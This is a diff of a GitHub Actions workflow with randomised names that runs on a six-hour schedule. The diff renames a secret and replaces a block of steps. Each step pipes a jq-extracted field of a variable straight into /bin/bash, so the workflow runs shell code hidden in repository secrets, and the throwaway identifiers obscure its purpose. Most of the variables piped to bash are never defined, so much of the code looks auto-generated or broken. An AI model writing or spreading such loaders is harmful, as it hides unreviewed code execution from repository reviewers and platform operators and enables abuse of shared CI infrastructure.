@@ -1,27 +1,25 @@
 name: durufei3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 0/6 * * *'
+    - cron: '39 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: durufei3456
         env:
-          s6443: ${{ secrets.s6443 }}
+          ff80523: ${{ secrets.ff80523 }}
         run: |
-          echo $s6443 | jq -r .tntcx423 | /bin/bash
-          echo $tqyp4560 | jq -r .modpf7614 | /bin/bash
-          echo $olzo5676 | jq -r .naton80 | /bin/bash
-          echo $lpuab3 | jq -r .kjt23 | /bin/bash
-          echo $m71946 | jq -r .rsmt82693 | /bin/bash
-          echo $eyrkx8165 | jq -r .wx42 | /bin/bash
-          echo $mtzny5 | jq -r .jvoh18 | /bin/bash
-          echo $cw45941 | jq -r .xmhpo13 | /bin/bash
-          echo $iwiq7 | jq -r .jde7838 | /bin/bash
-          echo $iz800 | jq -r .fqqn7988 | /bin/bash
-          echo $p046 | jq -r .toa25 | /bin/bash
-          echo $lwp76250 | jq -r .yaoj11555 | /bin/bash
+          echo $ff80523 | jq -r .lf41363 | /bin/bash
+          echo $ofgt09 | jq -r .niwcf74409 | /bin/bash
+          echo $yoym5767 | jq -r .jqm6 | /bin/bash
+          echo $wy3655 | jq -r .yltu29 | /bin/bash
+          echo $kphz510 | jq -r .oxeu822 | /bin/bash
+          echo $drvs06779 | jq -r .hii0 | /bin/bash
+          echo $dwffo7068 | jq -r .ciaa431 | /bin/bash
+          echo $n5 | jq -r .kgp42 | /bin/bash
 
